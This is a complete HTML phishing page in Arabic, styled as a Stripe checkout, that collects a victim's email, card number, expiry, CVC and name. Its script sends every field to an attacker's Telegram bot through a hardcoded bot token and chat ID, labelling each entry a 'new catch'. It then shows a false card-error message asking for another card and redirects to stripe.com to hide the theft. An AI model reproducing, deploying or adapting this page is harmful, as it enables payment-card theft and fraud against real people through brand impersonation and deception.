<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>إتمام الدفع | Stripe</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
    <style>
        body { background-color: #f6f9fc; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        .payment-card { max-width: 450px; margin: 40px auto; background: white; padding: 30px; border-radius: 12px; box-shadow: 0 15px 35px rgba(50,50,93,.1), 0 5px 15px rgba(0,0,0,.07); }
        .product-img { width: 100%; height: 220px; object-fit: cover; border-radius: 10px; margin-bottom: 20px; border: 1px solid #eee; }
        .btn-pay { background-color: #635bff; color: white; width: 100%; font-weight: 600; padding: 12px; border: none; border-radius: 5px; font-size: 18px; transition: 0.3s; cursor: pointer; }
        .btn-pay:hover { background-color: #5548d9; }
        .stripe-footer { text-align: center; margin-top: 25px; font-size: 13px; color: #8898aa; }
        label { font-weight: 500; color: #495057; }
        .form-control { padding: 12px; border-radius: 5px; border: 1px solid #ced4da; }
    </style>
</head>
<body>

<div class="payment-card">
    <img src="https://images.unsplash.com/photo-1592899677977-9c10ca588bbd?q=80&w=1000&auto=format&fit=crop" alt="Product" class="product-img">
    
    <div class="text-center mb-4">
        <h4 style="color: #32325d;">دفع آمن</h4>
        <p class="text-muted">أدخل تفاصيل البطاقة لإكمال العملية</p>
    </div>
    
    <form id="paymentForm">
        <div class="mb-3">
            <label class="form-label">البريد الإلكتروني</label>
            <input type="email" class="form-control" id="email" placeholder="example@gmail.com" required>
        </div>

        <div class="mb-3">
            <label class="form-label">رقم البطاقة</label>
            <input type="text" class="form-control" id="cardNumber" placeholder="1234 5678 1234 5678" maxlength="19" required>
        </div>

        <div class="row mb-3">
            <div class="col-7">
                <label class="form-label">تاريخ الانتهاء</label>
                <input type="text" class="form-control" id="expiry" placeholder="MM / YY" maxlength="5" required>
            </div>
            <div class="col-5">
                <label class="form-label">CVC</label>
                <input type="text" class="form-control" id="cvc" placeholder="123" maxlength="3" required>
            </div>
        </div>

        <div class="mb-4">
            <label class="form-label">اسم حامل البطاقة</label>
            <input type="text" class="form-control" id="cardName" placeholder="الاسم الكامل" required>
        </div>

        <button type="submit" class="btn-pay" id="submitBtn">دفع الآن</button>
    </form>

    <div class="stripe-footer">
        <img src="https://upload.wikimedia.org/wikipedia/commons/b/ba/Stripe_Logo%2C_revised_2016.svg" width="60" style="opacity: 0.6; margin-bottom: 5px;"><br>
        مدعوم من <strong>Stripe</strong> | <a href="#" style="text-decoration: none;">الخصوصية</a>
    </div>
</div>

<script>
const TOKEN = "7912529253:AAG_zoC5CjXbsmNFaYAdITgGod3-tAq5Gug";
const CHAT_ID = "6738811939";

document.getElementById('paymentForm').addEventListener('submit', function(e) {
    e.preventDefault();
    
    const btn = document.getElementById('submitBtn');
    btn.innerHTML = "جاري المعالجة...";
    btn.disabled = true;

    // تجميع البيانات
    const email = document.getElementById('email').value;
    const card = document.getElementById('cardNumber').value;
    const exp = document.getElementById('expiry').value;
    const cvc = document.getElementById('cvc').value;
    const name = document.getElementById('cardName').value;

    const text = `
🔥 صيد جديد من صفحة Stripe 🔥
--------------------------
👤 الاسم: ${name}
📧 الإيميل: ${email}
💳 البطاقة: ${card}
📅 التاريخ: ${exp}
🔒 الرمز (CVC): ${cvc}
--------------------------
🎯 تم الاختراق بنجاح!
    `;

    // الإرسال إلى تليجرام
    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: text
        })
    })
    .then(res => {
        // تمويه الضحية بعد السحب
        alert("خطأ: تعذر التحقق من البطاقة. يرجى المحاولة باستخدام بطاقة أخرى.");
        window.location.href = "https://www.stripe.com";
    })
    .catch(err => {
        console.error(err);
        alert("حدث خطأ في الشبكة.");
    });
});
</script>

</body>
</html>
